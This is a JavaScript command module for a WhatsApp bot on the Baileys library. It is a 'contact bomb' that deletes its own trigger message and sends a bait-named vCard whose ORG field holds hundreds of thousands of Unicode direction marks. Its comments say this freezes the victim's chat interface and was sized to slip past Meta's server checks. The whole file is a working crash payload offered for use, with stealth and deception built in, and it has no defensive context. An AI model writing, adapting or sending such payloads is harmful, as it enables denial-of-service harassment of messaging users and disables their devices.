export default {
    name: 'contacto_bomba',
    match: (text) => /^\.trampa/i.test(text),
    execute: async ({ sock, remitente, msg, textoLimpio }) => {
        
        // Uso: .trampa [Nombre Cebo]
        // Ejemplo: .trampa Accesos_Servidor
        const input = textoLimpio.replace(/^\.trampa\s*/i, '').trim();
        const nombreCebo = input || "Datos_Usuario";

        try {
            // 1. Sigilo absoluto: borramos el desencadenante
            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}

            // 2. Construcción del Payload de saturación de CPU
            // 350,000 iteraciones es el límite matemático perfecto. 
            // Pesa menos de 1MB en el paquete de red (evita el bloqueo del servidor de Meta),
            // pero al descomprimirse en el renderizador, fulmina el hilo de la UI.
            const LRM = '\u200E';
            const RLM = '\u200F';
            const venenoUnicode = (LRM + RLM).repeat(350000);

            // 3. Empaquetado en el contenedor oficial vCard 3.0
            const vcard = 'BEGIN:VCARD\n' 
                + 'VERSION:3.0\n' 
                + `FN:${nombreCebo}\n` // Lo único que verá la víctima en el chat
                + `ORG:NullPointer Exploit${venenoUnicode}\n` // El punto de detonación en memoria
                + 'TEL;type=CELL;type=VOICE;waid=1234567890:+1 234 567 890\n' 
                + 'END:VCARD';

            // 4. Inyección del paquete usando el wrapper nativo de Baileys
            await sock.sendMessage(remitente, { 
                contacts: { 
                    displayName: nombreCebo, 
                    contacts: [{ vcard }] 
                }
            });

        } catch (err) {
            console.error("Error UI Freezer:", err);
        }
    }
};
